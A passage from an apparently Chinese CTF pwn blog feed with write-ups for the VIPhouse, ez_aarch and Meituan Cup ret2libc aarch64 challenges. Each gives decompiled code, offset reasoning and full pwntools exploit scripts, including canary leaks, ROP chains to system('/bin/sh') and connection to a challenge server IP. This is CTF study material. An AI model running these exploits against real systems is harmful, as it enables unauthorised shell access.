(y/n)&quot;</span>);</span><br><span class="line">getchar();</span><br><span class="line">__isoc99_scanf(<span class="string">&quot;%c&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> ( v3 == <span class="string">&#x27;Y&#x27;</span> || v3 == <span class="string">&#x27;y&#x27;</span> )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&gt; Replace with:&quot;</span>);</span><br><span class="line">    getchar();</span><br><span class="line">    read_string((__int64)v14, <span class="number">104</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>有了canary其实就可以在Find_String里构造rop利用puts来泄露libc了，高版本的栈里是libc_start_call_main基本上没有工具可以寻找libc库</p><h2 id="VIPhouse"><a href="#VIPhouse" class="headerlink" title="VIPhouse"></a>VIPhouse</h2><p>login存在溢出</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">login</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">100</span>]; <span class="comment">// [rsp+0h] [rbp-2A0h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+64h] [rbp-23Ch] BYREF</span></span><br><span class="line">  <span class="type">char</span> v3[<span class="number">64</span>]; <span class="comment">// [rsp+258h] [rbp-48h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+298h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v2, <span class="number">0</span>, <span class="number">0x1F4</span>uLL);</span><br><span class="line">  <span class="built_in">memset</span>(v3, <span class="number">0</span>, <span class="keyword">sizeof</span>(v3));</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please enter your username: &quot;</span>);</span><br><span class="line">  get_str(s, <span class="number">99LL</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please enter your password: &quot;</span>);</span><br><span class="line">  get_str(v3, <span class="number">104LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s, <span class="string">&quot;admin&quot;</span>) &amp;&amp; !<span class="built_in">strcmp</span>(v3, <span class="string">&quot;root&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Welcome, ADMIN~&quot;</span>);</span><br><span class="line">    admin = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  user = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> v4 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>canary function里 用strcpy(s, random);给s赋值，random存在开头为0情况，导致s为b’\x00’*8，可以泄露canary</p><p>程序里没有gadget直接给rdi赋值，可以用下面来赋值</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">Add_Note</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Please delete at first!&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    ptr = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x30</span>uLL);</span><br><span class="line">    <span class="keyword">if</span> ( !ptr )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Failed to allocate memory.&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Enter your note: &quot;</span>);</span><br><span class="line">    get_str((__int64)ptr, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span> ( ptr )</span><br><span class="line">      <span class="built_in">strcpy</span>(dest, ptr);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Note added.&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Add_Note函数会把输入放到dest地址指向的内存</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0000000000401CB2 55                            push    rbp</span><br><span class="line">.text:0000000000401CB3 48 89 E5                      mov     rbp, rsp</span><br><span class="line">.text:0000000000401CB6 48 8D 05 73 24 00 00          lea     rax, dest;把dest地址给rax</span><br><span class="line">.text:0000000000401CBD 48 89 C7                      mov     rdi, rax</span><br><span class="line">.text:0000000000401CC0 48 8B 3F                      mov     rdi, [rdi];把dest地址指向的内存也就是我们的addnote函数里的输入给rdi</span><br><span class="line">.text:0000000000401CC3 C3                            retn</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./viphouse&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line">libcelf=elf.libc</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="number">1</span>)</span><br><span class="line">    <span class="comment"># io = process(pwnfile)</span></span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">b = <span class="keyword">lambda</span> : gdb.attach(io)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:<span class="built_in">print</span>(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + <span class="built_in">hex</span>(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_libc</span>(<span class="params">func_name,func_ad</span>):</span><br><span class="line">    p(func_name,func_ad)</span><br><span class="line">    <span class="keyword">global</span> libc </span><br><span class="line">    libc = LibcSearcher(func_name,func_ad)</span><br><span class="line">    libcbase=func_ad-libc.dump(func_name)</span><br><span class="line">    p(<span class="string">&#x27;libcbase&#x27;</span>,libcbase)</span><br><span class="line">    <span class="keyword">return</span> libcbase</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choice</span>(<span class="params">a</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Choose an option: &#x27;</span>,<span class="built_in">str</span>(a).encode())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">a,b</span>):</span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;: &#x27;</span>,a)</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;: &#x27;</span>,b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logout</span>():</span><br><span class="line">    choice(<span class="number">5</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">a</span>):</span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Choice: &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;note: &#x27;</span>,a)</span><br><span class="line"><span class="comment"># login(b&#x27;admin\x00&#x27;,b&#x27;root\x00&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># b()</span></span><br><span class="line"><span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line">    <span class="comment"># io = process(pwnfile)</span></span><br><span class="line">    io = remote(<span class="string">&#x27;118.24.31.155&#x27;</span>,<span class="string">&#x27;9999&#x27;</span>) </span><br><span class="line">    <span class="comment"># nc 118.24.31.155 9999</span></span><br><span class="line">    login(<span class="string">b&#x27;admin\x00&#x27;</span>,<span class="string">b&#x27;root\x00&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;: &#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;: \n&#x27;</span>, <span class="string">b&#x27;\0&#x27;</span> * <span class="number">0x10</span>)</span><br><span class="line">    result = io.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;give you a gif&#x27;</span> <span class="keyword">in</span> result:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io.close()</span><br><span class="line"><span class="comment"># db(&#x27;b *0x0401AC3&#x27;)</span></span><br><span class="line"></span><br><span class="line">add(p64(elf.got[<span class="string">&#x27;puts&#x27;</span>]))</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;Choice: &#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(result.split(<span class="string">b&#x27;!&#x27;</span>)[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">p(<span class="string">&#x27;canary&#x27;</span>,canary)</span><br><span class="line">ret_ad=<span class="number">0x4012D0</span></span><br><span class="line">setrdi=<span class="number">0x0401CB6</span></span><br><span class="line">paylaod=<span class="number">0x40</span>*<span class="string">b&#x27;a&#x27;</span>+flat([canary,<span class="number">0</span>,setrdi,elf.plt[<span class="string">&#x27;puts&#x27;</span>],ret_ad])</span><br><span class="line">logout()</span><br><span class="line">login(<span class="string">b&#x27;admin&#x27;</span>,paylaod)</span><br><span class="line">puts_ad=uu64(r(<span class="number">6</span>))</span><br><span class="line">libcbase=find_libc(<span class="string">&#x27;puts&#x27;</span>,puts_ad)</span><br><span class="line">libcelf.address=libcbase</span><br><span class="line">pop_rdi_ret=<span class="built_in">next</span>(libcelf.search(asm(<span class="string">&#x27;pop rdi;ret&#x27;</span>)))</span><br><span class="line"><span class="built_in">print</span>(pop_rdi_ret)</span><br><span class="line">binsh=libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)+libcbase</span><br><span class="line">system=libc.dump(<span class="string">&#x27;system&#x27;</span>)+libcbase</span><br><span class="line">p(<span class="string">&#x27;system&#x27;</span>,system)</span><br><span class="line">add(p64(binsh))</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;Choice: &#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">logout()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(rop.ret.address))</span><br><span class="line">payload=<span class="number">0x40</span>*<span class="string">b&#x27;a&#x27;</span>+flat([canary,<span class="number">0</span>,setrdi,system])<span class="comment">#最后用pop rdi给system参数赋值的话，由于栈地址对齐需要垫一个ret，溢出长度会不够</span></span><br><span class="line">login(<span class="string">b&#x27;admin&#x27;</span>,payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>初探aarch64 pwn</title>
      <link href="/2023/07/20/first-aarch64-pwn/"/>
      <url>/2023/07/20/first-aarch64-pwn/</url>
      
        <content type="html"><![CDATA[<p>start-g.sh</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">qemu-aarch -L /usr/aarch64-linux-gnu/ ./a.out</span><br></pre></td></tr></table></figure><p>attach.sh</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">sudo gdb-multiarch ./a.out -ex <span class="string">&quot;target remote:1234&quot;</span></span><br></pre></td></tr></table></figure><p>python脚本里</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">io=process([<span class="string">&quot;qemu-aarch64&quot;</span>,<span class="string">&quot;-g&quot;</span>, <span class="string">&quot;1234&quot;</span>,<span class="string">&quot;-L&quot;</span>,<span class="string">&quot;/usr/aarch64-linux-gnu/&quot;</span>,pwnfile])<span class="comment">#调试</span></span><br><span class="line">io=process([<span class="string">&quot;qemu-aarch64&quot;</span>,<span class="string">&quot;-L&quot;</span>,<span class="string">&quot;/usr/aarch64-linux-gnu/&quot;</span>,pwnfile])<span class="comment">#不调试</span></span><br><span class="line"></span><br><span class="line">gdb.attach(io,<span class="string">&#x27;target remote localhost:1234&#x27;</span>,exe=pwnfile,arch=<span class="string">&#x27;aarch64&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="Dest0g3-520迎新赛-ez-aarch"><a href="#Dest0g3-520迎新赛-ez-aarch" class="headerlink" title="Dest0g3_520迎新赛_ez_aarch"></a>Dest0g3_520迎新赛_ez_aarch</h2><p>有后门的简单溢出，改最后一个字节就行，关于padding的数量因为需要修改的是调用函数的返回地址，所以ida下面这个就没用了</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> buf; <span class="comment">// [xsp+10h] [xbp+10h] BYREF</span></span><br></pre></td></tr></table></figure><p>偏移可以用cyclic来确定，或者去看汇编</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">0000000000000968</span> FD <span class="number">7B</span> BD A9                   STP             X29, X30, [SP,#<span class="number">-0x30</span>]!</span><br><span class="line">.text:<span class="number">000000000000096</span>C FD <span class="number">03</span> <span class="number">00</span> <span class="number">91</span>                   MOV             X29, SP</span><br><span class="line">.text:<span class="number">0000000000000970</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">90</span> <span class="number">00</span> A0 <span class="number">2</span>A <span class="number">91</span>       ADRL            X0, aPleaseLeaveYou     ; <span class="string">&quot;Please leave your name:&quot;</span></span><br><span class="line">.text:<span class="number">0000000000000978</span> <span class="number">92</span> FF FF <span class="number">97</span>                   BL              .<span class="built_in">puts</span></span><br><span class="line">.text:<span class="number">0000000000000978</span></span><br><span class="line">.text:<span class="number">000000000000097</span>C E0 <span class="number">43</span> <span class="number">00</span> <span class="number">91</span>                   ADD             X0, SP, #<span class="number">0x10</span></span><br><span class="line">.text:<span class="number">0000000000000980</span> <span class="number">02</span> <span class="number">06</span> <span class="number">80</span> <span class="number">52</span>                   MOV             W2, #<span class="number">0x30</span> ; <span class="string">&#x27;0&#x27;</span>         ; nbytes</span><br><span class="line">.text:<span class="number">0000000000000984</span> E1 <span class="number">03</span> <span class="number">00</span> AA                   MOV             X1, X0                  ; buf</span><br><span class="line">.text:<span class="number">0000000000000988</span> <span class="number">00</span> <span class="number">00</span> <span class="number">80</span> <span class="number">52</span>                   MOV             W0, #<span class="number">0</span>                  ; fd</span><br><span class="line">.text:<span class="number">000000000000098</span>C <span class="number">91</span> FF FF <span class="number">97</span>                   BL              .read</span><br><span class="line">.text:<span class="number">000000000000098</span>C</span><br><span class="line">.text:<span class="number">0000000000000990</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">90</span> <span class="number">00</span> <span class="number">00</span> <span class="number">2B</span> <span class="number">91</span>       ADRL            X0, aOkYouCanExploi     ; <span class="string">&quot;OK, you can exploit it now.&quot;</span></span><br><span class="line">.text:<span class="number">0000000000000998</span> <span class="number">8</span>A FF FF <span class="number">97</span>                   BL              .<span class="built_in">puts</span></span><br><span class="line">.text:<span class="number">0000000000000998</span></span><br><span class="line">.text:<span class="number">000000000000099</span>C <span class="number">1F</span> <span class="number">20</span> <span class="number">03</span> D5                   NOP</span><br><span class="line">.text:<span class="number">00000000000009</span>A0 FD <span class="number">7B</span> C3 A8                   LDP             X29, X30, [SP+<span class="number">0x30</span>+var_30],#<span class="number">0x30</span></span><br><span class="line">.text:<span class="number">00000000000009</span>A4 C0 <span class="number">03</span> <span class="number">5F</span> D6                   RET</span><br></pre></td></tr></table></figure><p><code> STP             X29, X30, [SP,#-0x30]!</code>把fp和x30存到栈里后把sp提升了0x30,<code>ADD             X0, SP, #0x10</code>buf地址是sp+0x10所以buf距离fp位0x20 距离lr为0x28</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"><span class="title function_">context</span><span class="params">(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;aarch64&#x27;</span>)</span></span><br><span class="line">pwnfile=<span class="string">&#x27;./ez_aarch&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/usr/aarch64-linux-gnu//lib/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="meta"># io = process(pwnfile)</span></span><br><span class="line">    io=process([<span class="string">&quot;qemu-aarch64&quot;</span>,<span class="string">&quot;-g&quot;</span>, <span class="string">&quot;1234&quot;</span>,<span class="string">&quot;-L&quot;</span>,<span class="string">&quot;/usr/aarch64-linux-gnu/&quot;</span>,pwnfile])#调试</span><br><span class="line">    <span class="meta"># io=process([<span class="string">&quot;qemu-aarch64&quot;</span>,<span class="string">&quot;-L&quot;</span>,<span class="string">&quot;/usr/aarch64-linux-gnu/&quot;</span>,pwnfile])#不调试</span></span><br><span class="line">r = lambda x: io.recv(x)</span><br><span class="line">ra = lambda: io.recvall()</span><br><span class="line">rl = lambda: io.recvline(keepends=True)</span><br><span class="line">ru = lambda x: io.recvuntil(x, drop=True)</span><br><span class="line">s = lambda x: io.send(x)</span><br><span class="line">sl = lambda x: io.sendline(x)</span><br><span class="line">sa = lambda x, y: io.sendafter(x, y)</span><br><span class="line">sla = lambda x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = lambda: io.interactive()</span><br><span class="line">c = lambda: io.close()</span><br><span class="line">li = lambda x: <span class="built_in">log</span>.info(x)</span><br><span class="line">db = lambda x : gdb.attach(io,x)</span><br><span class="line">b = lambda : gdb.attach(io)</span><br><span class="line">uu32 = lambda x   : u32(x.ljust(<span class="number">4</span>,b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>))</span><br><span class="line">uu64 = lambda x   : u64(x.ljust(<span class="number">8</span>,b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>))</span><br><span class="line">p =lambda x,y:print(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + hex(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line">gdb.attach(io,<span class="string">&#x27;target remote localhost:1234&#x27;</span>,exe=pwnfile,arch=<span class="string">&#x27;aarch64&#x27;</span>)</span><br><span class="line">padding=b<span class="number">&#x27;</span>a<span class="number">&#x27;</span>*<span class="number">40</span></span><br><span class="line">s(padding+p8(<span class="number">0x3c</span>))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="2022年美团杯-ret2libc-aarch64"><a href="#2022年美团杯-ret2libc-aarch64" class="headerlink" title="2022年美团杯_ret2libc_aarch64"></a>2022年美团杯_ret2libc_aarch64</h2><p>给一次泄露地址的机会，还有一次溢出机会</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">0000000000400948</span>                               ; __unwind &#123;</span><br><span class="line">.text:<span class="number">0000000000400948</span> FD <span class="number">7B</span> B7 A9                   STP             X29, X30, [SP,#<span class="number">-0x90</span>]!</span><br><span class="line">.text:<span class="number">000000000040094</span>C FD <span class="number">03</span> <span class="number">00</span> <span class="number">91</span>                   MOV             X29, SP</span><br><span class="line">.text:<span class="number">0000000000400950</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">90</span> <span class="number">00</span> C0 <span class="number">2</span>A <span class="number">91</span>       ADRL            X0, asc_400AB0          ; <span class="string">&quot;&gt; &quot;</span></span><br><span class="line">.text:<span class="number">0000000000400958</span> <span class="number">5</span>E FF FF <span class="number">97</span>                   BL              .<span class="built_in">printf</span></span><br><span class="line">.text:<span class="number">0000000000400958</span></span><br><span class="line">.text:<span class="number">000000000040095</span>C E0 <span class="number">43</span> <span class="number">00</span> <span class="number">91</span>                   ADD             X0, SP, #<span class="number">0x10</span></span><br><span class="line">.text:<span class="number">0000000000400960</span> <span class="number">60</span> FF FF <span class="number">97</span>                   BL              .gets</span><br></pre></td></tr></table></figure><p>计算一下padding 0x90-0x10+0x8&#x3D;0x88,接下来就是找gadget，好难找</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary  /usr/aarch64-linux-gnu/lib/libc.so<span class="number">.6</span> | grep <span class="string">&#x27;ldr x0&#x27;</span> </span><br><span class="line"><span class="number">000069500</span> : ldr x0, [sp, #<span class="number">0x18</span>] ; ldp x29, x30, [sp], #<span class="number">0x20</span> ; ret</span><br></pre></td></tr></table></figure><p>ldr x0, [sp, #0x18] ; 把sp+0x18处的值写入x0，布置为&#x2F;bin&#x2F;sh地址</p><p>ldp x29, x30, [sp], #0x20 ; 把sp处的值写入x29 sp+8处的值写入x30 所以sp+8处布置system地址</p><p>利用cyclic动调去找偏移</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">padding=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x88</span></span><br><span class="line">sla(<span class="string">b&#x27;&gt;&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">payload=padding+p64(gadget)+cyclic(<span class="number">100</span>)</span><br></pre></td></tr></table></figure><p><img src="/2023/07/20/first-aarch64-pwn/image-20230720164531216.png" alt="image-20230720164531216"></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu22 ~&gt; cyclic -l gaaa</span><br><span class="line"><span class="number">24</span></span><br><span class="line">grxer@Ubuntu22 ~ [<span class="number">1</span>]&gt; cyclic -l kaaa</span><br><span class="line"><span class="number">40</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;aarch64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/usr/aarch64-linux-gnu/lib/libc.so.6&#x27;</span>)</span><br><span class="line">libcrop=ROP(libc)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="comment"># io = process(pwnfile)</span></span><br><span class="line">    io=process([<span class="string">&quot;qemu-aarch64&quot;</span>,<span class="string">&quot;-g&quot;</span>, <span class="string">&quot;1234&quot;</span>,<span class="string">&quot;-L&quot;</span>,<span class="string">&quot;/usr/aarch64-linux-gnu/&quot;</span>,<span class="string">&quot;./pwn&quot;</span>])</span><br><span class="line">    <span class="comment"># io=process([&quot;qemu-aarch64&quot;,&quot;-L&quot;,&quot;/usr/aarch64-linux-gnu/&quot;,&quot;./pwn&quot;])</span></span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">b = <span class="keyword">lambda</span> : gdb.attach(io)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:<span class="built_in">print</span>(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + <span class="built_in">hex</span>(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line">gdb.attach(io,<span class="string">&#x27;target remote localhost:1234&#x27;</span>,exe=pwnfile,arch=<span class="string">&#x27;aarch64&#x27;</span>)</span><br><span class="line">sla(<span class="string">b&#x27;&gt;&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">s(p64(elf.got[<span class="string">&#x27;puts&#x27;</span>]))</span><br><span class="line"><span class="comment">#0x55008cae70</span></span><br><span class="line">ru(<span class="string">b&#x27;le&gt;&gt;\n&#x27;</span>)</span><br><span class="line">puts_ad=uu32(r(<span class="number">3</span>))+<span class="number">0x5500000000</span></span><br><span class="line">p(<span class="string">&#x27;puts_ad&#x27;</span>,puts_ad)</span><br><span class="line">libc_base=puts_ad-libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">binsh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">p(<span class="string">&#x27;libc_base&#x27;</span>,libc_base)</span><br><span class="line">p(<span class="string">&#x27;system_addr&#x27;</span>,system_addr)</span><br><span class="line">p(<span class="string">&#x27;bin&#x27;</span>,binsh)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">ROPgadget --binary  /usr/aarch64-linux-gnu/lib/libc.so.6 | grep &#x27;ldr x0&#x27; </span></span><br><span class="line"><span class="string">000069500 : ldr x0, [sp, #0x18] ; ldp x29, x30, [sp], #0x20 ; ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">gadget=libc_base+<span class="number">0x00069500</span></span><br><span class="line">padding=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x88</span></span><br><span class="line">sla(<span class="string">b&#x27;&gt;&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">payload=padding+p64(gadget)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span>+p64(system_addr)+p64(<span class="number">40</span>-<span class="number">24</span>-<span class="number">8</span>)+p64(binsh)</span><br><span class="line">sla(<span class="string">b&#x27;&gt;&#x27;</span>,payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Aarch64 ASM</title>
      <link href="/2023/07/19/aarch64-asm/"/>
      <url>/2023/07/19/aarch64-asm/</url>
      
